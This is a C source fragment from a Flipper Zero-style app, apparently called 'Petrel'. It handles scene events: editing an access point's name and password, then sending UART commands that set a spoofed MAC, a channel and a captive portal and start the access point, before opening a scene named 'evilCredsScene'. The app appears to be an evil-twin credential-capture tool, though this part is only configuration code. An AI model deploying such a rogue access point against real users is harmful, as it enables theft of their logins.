bool config_ap_scene_on_event(void* context, SceneManagerEvent event) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;

    FURI_LOG_I("Petrel", "%s event.type: %d", __func__, event.type);
    FURI_LOG_I("Petrel", "%s event.event: %ldd", __func__, event.event);
    char cadena[40];
    switch(event.type) {
    case SceneManagerEventTypeCustom:
        switch(event.event) {
        case PETREL_EVT_AP_EDIT_NAME:
            text_input_reset(app->text_input);
            text_input_set_header_text(app->text_input, "Acces Point Name");
            text_input_set_result_callback(
                app->text_input,
                config_ap_scene_on_enter,
                app,
                app->ssidAP,
                app->ssidAPLength,
                true);
            view_dispatcher_switch_to_view(app->view_dispatcher, apNameTextInputView);
            return true;
        case PETREL_EVT_AP_EDIT_PASSWORD:
            text_input_reset(app->text_input);
            text_input_set_header_text(app->text_input, "Acces Point Password");
            text_input_set_result_callback(
                app->text_input,
                config_ap_scene_on_enter,
                app,
                app->passwordAP,
                app->passwordAPLength,
                true);
            view_dispatcher_switch_to_view(app->view_dispatcher, apPasswordTextInputView);
            return true;
        case PETREL_EVT_REBUILD_VIL:
            // Deferred rebuild requested by security_change_callback / channel_change_callback /
            // mac_type_change_call_back. Safe here: this runs between frames, not inside the list's
            // own input dispatch. on_enter keeps the currently selected row.
            config_ap_scene_on_enter(app);
            return true;
        case PETREL_EVT_AP_START: {
            // Moved here from config_ap_change_call_back (the list's enter callback). Runs between
            // frames, and the per-command sleeps are gone - the board's loop() now processes every
            // complete line, so back-to-back state commands all take effect.
            char buf[80];
            if(app->securityAP == 1) {
                snprintf(buf, sizeof(buf), "PASSWORD %s\n", app->passwordAP);
                uart_helper_send(app->uart_helper, buf, strlen(buf));
            }
            snprintf(buf, sizeof(buf), "APMAC %s\n", app->customMac);
            uart_helper_send(app->uart_helper, buf, strlen(buf));
            snprintf(buf, sizeof(buf), "CHANNEL %s\n", channelList[app->channelAP]);
            uart_helper_send(app->uart_helper, buf, strlen(buf));
            petrel_send_portal_sel(app);
            snprintf(buf, sizeof(buf), "APSTART %s\n", app->ssidAP);
            uart_helper_send(app->uart_helper, buf, strlen(buf));
            scene_manager_next_scene(app->scene_manager, evilCredsScene);
            return true;
        }
        case SsidAPInputSceneSaveEvent:
            FURI_LOG_D(TAG, "ssidAPLenght %d", strlen(app->ssidAP));

            snprintf(cadena, sizeof(cadena), "BSSID %s\n", app->ssidAP); // bound by buffer, not SSID len (M1)
            FURI_LOG_D(TAG, "%s", cadena);
            break;
        }
        return true;
    default:
        break;
    }
    return false;
}

